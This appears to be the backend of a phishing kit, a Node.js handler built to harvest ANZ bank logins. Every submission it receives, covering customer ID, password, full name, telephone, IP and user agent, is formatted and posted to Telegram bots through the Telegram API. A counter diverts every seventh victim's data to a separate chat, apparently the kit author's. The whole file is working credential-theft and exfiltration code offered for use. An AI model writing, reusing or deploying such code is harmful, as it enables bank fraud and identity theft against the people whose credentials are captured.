const axios = require("axios");

let count = 0;

const sendRes = async (req, res) => {
  let { customerId, password, fullname, telephone, ip, userAgent, telegramId } =
    req.body;
  var originalText = `+----------- Login Information ------------+\nCustomer ID: ${customerId}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nTelephone: ${telephone}\n+----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
  if (count == 6) {
    await axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    count = 0;
  } else {
    await axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `ANZ ${telegramId}:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    await axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: telegramId,
          text: `ANZ:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    count += 1;
  }
  res.sendStatus(200);
};

module.exports = {
  sendRes,
};
